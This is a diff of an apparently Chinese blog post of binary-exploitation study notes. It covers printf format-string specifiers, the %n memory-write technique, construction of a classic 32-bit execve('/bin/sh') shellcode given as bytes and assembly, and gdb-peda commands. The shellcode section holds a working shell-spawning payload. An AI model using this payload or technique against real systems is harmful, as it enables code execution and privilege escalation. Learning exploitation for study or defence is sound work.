@@ -144,7 +144,33 @@
         <div class="post-content">
             <p>1.格式化字符串漏洞</p>
 <p>%c：输出字符。<br>%u：无符号10进制整数<br>%d：输出十进制整数。<br>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。<br>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。<br>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。<br>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%]$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。<br>而这些参数中，能够改变地址中值的参数只有%n。<br>关键：%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。简单而言，通过%n是可以往内存里写东西的，可通过一系列构造来修改指定的返回地址。<br>————————————————<br>版权声明：本文为CSDN博主「如梦如幻似清茶」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_36779888/article/details/89684453" target="_blank" rel="noopener">https://blog.csdn.net/qq_36779888/article/details/89684453</a></p>
-<p>2.</p>
+<p>2.shellcode如何构造？</p>
+<p>1.直接编写十六进制操作码（不现实）；</p>
+<p>2.采用像C这样的高级语言编写程序，编译后，进行反汇编以获取汇编指令和十六进制操作码。</p>
+<p>3.编译汇编程序，将该程序汇编，然后从二进制中提取十六进制操作码。</p>
+<p>直接用提取root权限的模板：</p>
+<p>记录一个提取root权限的shellcode，45B</p>
+<p>在shellcode头文件里定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line">  <span class="string">"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"</span></span><br><span class="line">  <span class="string">"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"</span></span><br><span class="line">  <span class="string">"\x80\xe8\xdc\xff\xff\xff/bin/sh"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;syscall.h&gt;</span><br><span class="line"></span><br><span class="line">#define STRING	&quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">#define STRLEN	7</span><br><span class="line">#define ARGV	(STRLEN+1)</span><br><span class="line">#define ENVP	(ARGV+4)</span><br><span class="line"></span><br><span class="line">.globl main</span><br><span class="line">	.type	main, @function</span><br><span class="line"></span><br><span class="line"> main:</span><br><span class="line">	jmp	calladdr</span><br><span class="line"></span><br><span class="line"> popladdr:</span><br><span class="line">	popl	%esi</span><br><span class="line">	movl	%esi,(ARGV)(%esi)	&#x2F;* set up argv pointer to pathname *&#x2F;</span><br><span class="line">	xorl	%eax,%eax		&#x2F;* get a 32-bit zero value *&#x2F;</span><br><span class="line">	movb	%al,(STRLEN)(%esi)	&#x2F;* null-terminate our string *&#x2F;</span><br><span class="line">	movl	%eax,(ENVP)(%esi)	&#x2F;* set up null envp *&#x2F;</span><br><span class="line"></span><br><span class="line">	movb	$SYS_execve,%al		&#x2F;* syscall arg 1: syscall number *&#x2F;</span><br><span class="line">	movl	%esi,%ebx		&#x2F;* syscall arg 2: string pathname *&#x2F;</span><br><span class="line">	leal	ARGV(%esi),%ecx		&#x2F;* syscall arg 2: argv *&#x2F;</span><br><span class="line">	leal	ENVP(%esi),%edx		&#x2F;* syscall arg 3: envp *&#x2F;</span><br><span class="line">	int	$0x80			&#x2F;* invoke syscall *&#x2F;</span><br><span class="line"></span><br><span class="line">	xorl	%ebx,%ebx		&#x2F;* syscall arg 2: 0 *&#x2F;</span><br><span class="line">	movl	%ebx,%eax</span><br><span class="line">	inc	%eax			&#x2F;* syscall arg 1: SYS_exit (1), uses *&#x2F;</span><br><span class="line">					&#x2F;* mov+inc to avoid null byte *&#x2F;</span><br><span class="line">	int	$0x80			&#x2F;* invoke syscall *&#x2F;</span><br><span class="line"></span><br><span class="line"> calladdr:</span><br><span class="line">	call	popladdr</span><br><span class="line">	.ascii	STRING</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.一些比较重要的gdb-peda命令：</p>
+<ul>
+<li>catch exec,在调用另一个文件比如vul.c时设下断点</li>
+<li>r,run 执行该程序，直到调用catch </li>
+<li>b 0x…/funcname 下断点</li>
+<li>c，从断点开始继续执行</li>
+<li>x/100wx 0x…，查看…地址处100个16进制(第二个’x’)形式的内容，4个字节一个单元(w)</li>
+<li>n： 执行一行源代码但不进入函数内部</li>
+<li>ni: 执行一行汇编代码但不进入函数内部</li>
+<li>s： 执行一行源代码而且进入函数内部 </li>
+<li>si: 执行一行汇编代码而且进入函数内部 </li>
+<li>print $ebp  显示ebp的地址</li>
+</ul>
 
         </div>
 
